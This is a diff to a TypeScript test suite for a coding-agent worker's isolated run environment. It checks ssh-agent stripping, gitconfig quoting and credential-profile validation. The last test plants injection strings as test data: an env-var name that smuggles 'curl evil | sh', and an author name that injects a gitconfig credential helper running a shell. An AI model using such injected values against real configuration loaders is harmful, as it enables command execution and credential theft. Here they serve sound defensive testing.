@@ -965,7 +965,7 @@ function jsonlConfigLite(): import('../src/adapters/localAgentAdapter.ts').Local
 const MOCK_RPC = join(import.meta.dirname, 'fixtures', 'mock-prime-agent-rpc.mjs');
 
 
-import { buildRunEnvironment, CredentialSourceMissingError, renderGitconfig } from '../src/worker/runEnvironment.ts';
+import { buildRunEnvironment, CredentialSourceMissingError, NO_SSH_COMMAND, renderGitconfig } from '../src/worker/runEnvironment.ts';
 import { isStrippedEnvName, STRIPPED_ENV_PREFIXES } from '../src/config.ts';
 import { validateLocalAgentConfig } from '../src/adapters/localAgentAdapter.ts';
 import { validateRpcAgentConfig } from '../src/adapters/rpcAgentAdapter.ts';
@@ -1025,8 +1025,8 @@ test('buildRunEnvironment: four layers — strip, isolation, profile env, GIT_AU
   assert.equal(built.env.GIT_COMMITTER_EMAIL, 'nightly@example.com');
   // The generated gitconfig carries the identity and the helper; the token appears only by NAME.
   const gitconfig = readFileSync(built.gitconfigPath!, 'utf8');
-  assert.match(gitconfig, /name = mercury-nightly/);
-  assert.match(gitconfig, /email = nightly@example.com/);
+  assert.match(gitconfig, /name = "mercury-nightly"/);
+  assert.match(gitconfig, /email = "nightly@example.com"/);
   assert.match(gitconfig, /credential "https:\/\/github\.com"/);
   assert.match(gitconfig, /\$GH_TOKEN/);
   assert.ok(!gitconfig.includes('ghp_'), 'the token value must never appear in the gitconfig');
@@ -1212,7 +1212,7 @@ test('worker: a profile Run drives the agent on the layered environment (accepta
     // old `{ ...process.env }` spawn base, the ambient GH_TOKEN appears here and fails this test.
     for (const [k, v] of Object.entries(spawnedEnv)) {
       if (['MERCURY_RUN_ID', 'MERCURY_TRACE_ID', 'MERCURY_WORKER_ID'].includes(k)) continue; // adapter trace context
-      if (['GIT_CONFIG_GLOBAL', 'GIT_CONFIG_NOSYSTEM', 'GH_CONFIG_DIR'].includes(k)) continue; // layer 2 isolation (§6.1)
+      if (['GIT_CONFIG_GLOBAL', 'GIT_CONFIG_NOSYSTEM', 'GH_CONFIG_DIR', 'GIT_SSH_COMMAND'].includes(k)) continue; // layer 2 isolation (§6.1)
       if (k === 'GH_TOKEN') continue; // layer 3: the profile's own variable, asserted below
       if (k.startsWith('GIT_AUTHOR_') || k.startsWith('GIT_COMMITTER_')) continue; // layer 3 identity (§6.2)
       assert.ok(!isStrippedEnvName(k), `${k} must be stripped from the spawned environment`);
@@ -1224,7 +1224,14 @@ test('worker: a profile Run drives the agent on the layered environment (accepta
     assert.equal(spawnedEnv.GIT_AUTHOR_NAME, 'mercury-nightly');
     assert.equal(spawnedEnv.GIT_COMMITTER_EMAIL, 'nightly@example.com');
     // Isolation layer landed in the run dir.
-    assert.ok(spawnedEnv.GIT_CONFIG_GLOBAL && existsSync(spawnedEnv.GIT_CONFIG_GLOBAL));
+    // Isolation layer lives OUTSIDE the workspace and is removed when the Run ends (#977 review).
+    const ws = env.runs.get(run.id)!.workspacePath!;
+    assert.ok(spawnedEnv.GIT_CONFIG_GLOBAL, 'GIT_CONFIG_GLOBAL is set');
+    assert.ok(!spawnedEnv.GIT_CONFIG_GLOBAL.startsWith(ws), 'the generated gitconfig is not inside the workspace');
+    assert.ok(!spawnedEnv.GH_CONFIG_DIR.startsWith(ws), 'GH_CONFIG_DIR is not inside the workspace');
+    assert.ok(!existsSync(join(ws, 'gitconfig')) && !existsSync(join(ws, 'gh')), 'nothing generated lands in the worktree');
+    assert.ok(!existsSync(spawnedEnv.GIT_CONFIG_GLOBAL), 'the per-Run config dir is removed when the Run ends');
+    assert.equal(spawnedEnv.GIT_SSH_COMMAND, NO_SSH_COMMAND);
     assert.equal(spawnedEnv.GIT_CONFIG_NOSYSTEM, '1');
     assert.ok(spawnedEnv.GH_CONFIG_DIR && spawnedEnv.GH_CONFIG_DIR.includes('gh'));
     // Ordinary environment still flows.
@@ -1264,11 +1271,18 @@ test('worker: a no-profile Run is isolated too (empty gitconfig, no host gitconf
     const spawnedEnv = JSON.parse(readFileSync(envFile, 'utf8')) as Record<string, string>;
     for (const [k, v] of Object.entries(spawnedEnv)) {
       if (['MERCURY_RUN_ID', 'MERCURY_TRACE_ID', 'MERCURY_WORKER_ID'].includes(k)) continue;
-      if (['GIT_CONFIG_GLOBAL', 'GIT_CONFIG_NOSYSTEM', 'GH_CONFIG_DIR'].includes(k)) continue; // layer 2
+      if (['GIT_CONFIG_GLOBAL', 'GIT_CONFIG_NOSYSTEM', 'GH_CONFIG_DIR', 'GIT_SSH_COMMAND'].includes(k)) continue; // layer 2
       assert.ok(!isStrippedEnvName(k), `${k} must be stripped even without profiles`);
       assert.ok(!String(v).includes('worker-ambient-token'), `${k} must not carry the worker ambient token`);
     }
-    assert.ok(spawnedEnv.GIT_CONFIG_GLOBAL && existsSync(spawnedEnv.GIT_CONFIG_GLOBAL));
+    // Isolation layer lives OUTSIDE the workspace and is removed when the Run ends (#977 review).
+    const ws = env.runs.get(run.id)!.workspacePath!;
+    assert.ok(spawnedEnv.GIT_CONFIG_GLOBAL, 'GIT_CONFIG_GLOBAL is set');
+    assert.ok(!spawnedEnv.GIT_CONFIG_GLOBAL.startsWith(ws), 'the generated gitconfig is not inside the workspace');
+    assert.ok(!spawnedEnv.GH_CONFIG_DIR.startsWith(ws), 'GH_CONFIG_DIR is not inside the workspace');
+    assert.ok(!existsSync(join(ws, 'gitconfig')) && !existsSync(join(ws, 'gh')), 'nothing generated lands in the worktree');
+    assert.ok(!existsSync(spawnedEnv.GIT_CONFIG_GLOBAL), 'the per-Run config dir is removed when the Run ends');
+    assert.equal(spawnedEnv.GIT_SSH_COMMAND, NO_SSH_COMMAND);
   } finally {
     env.close();
     delete process.env.MOCK_RPC_MODE;
@@ -1311,4 +1325,37 @@ test('worker: a file: source missing at drive time fails the Run with the §9 me
     env.worker.stop();
     env.close();
   }
+});
+
+test('CP-4 review (#977): no Run gets the host ssh agent or keys; values are quoted; names and author fields are validated', () => {
+  const dir = tempDir('cp4-r1-');
+  // ssh: stripped agent socket, a no-identity GIT_SSH_COMMAND, for no-profile and profile Runs alike.
+  const none = buildRunEnvironment({ workerEnv: { PATH: '/usr/bin:/bin', SSH_AUTH_SOCK: '/tmp/agent.sock', GIT_SSH_COMMAND: 'ssh -i ~/.ssh/host' } as never, runDir: dir, profile: null });
+  assert.equal(none.env.SSH_AUTH_SOCK, undefined, 'the agent socket is stripped');
+  assert.equal(none.env.GIT_SSH_COMMAND, NO_SSH_COMMAND);
+  assert.match(NO_SSH_COMMAND, /IdentityAgent=none/);
+  assert.match(NO_SSH_COMMAND, /-F \/dev\/null/);
+
+  // gitconfig values are quoted and escaped; a quote or backslash cannot break out.
+  const text = renderGitconfig({
+    name: 'p', repositories: ['github.com/o/r'], owners: [], env: {}, sandbox: false,
+    git: { authorName: 'Roman "R" \\ Melnyk', authorEmail: 'r@example.com' },
+  } as never);
+  assert.match(text, /\tname = "Roman \\"R\\" \\\\ Melnyk"/);
+  assert.match(text, /\temail = "r@example\.com"/);
+
+  // load-time validation
+  const cfg = join(dir, 'cfg', 'mercury');
+  mkdirSync(cfg, { recursive: true });
+  const write = (profile: object) => {
+    writeFileSync(join(cfg, 'credential-profiles.json'), JSON.stringify({ profiles: [profile] }));
+    chmodSync(join(cfg, 'credential-profiles.json'), 0o600);
+  };
+  const base = { name: 'p', repositories: ['github.com/o/r'], owners: ['a'], sandbox: false };
+  write({ ...base, env: { 'X"; curl evil | sh; "': { value: 'v' } } });
+  assert.throws(() => loadCredentialProfiles({ XDG_CONFIG_HOME: join(dir, 'cfg') } as never), /must match \[A-Za-z_\]/);
+  write({ ...base, env: { GH_TOKEN: { value: 'v' } }, git: { authorName: 'evil\n[credential]\n\thelper = !sh' } });
+  assert.throws(() => loadCredentialProfiles({ XDG_CONFIG_HOME: join(dir, 'cfg') } as never), /authorName must not contain control characters/);
+  write({ ...base, env: { GH_TOKEN: { value: 'v' } }, git: { authorEmail: 'a@b.c\r\n' } });
+  assert.throws(() => loadCredentialProfiles({ XDG_CONFIG_HOME: join(dir, 'cfg') } as never), /authorEmail must not contain control characters/);
 });
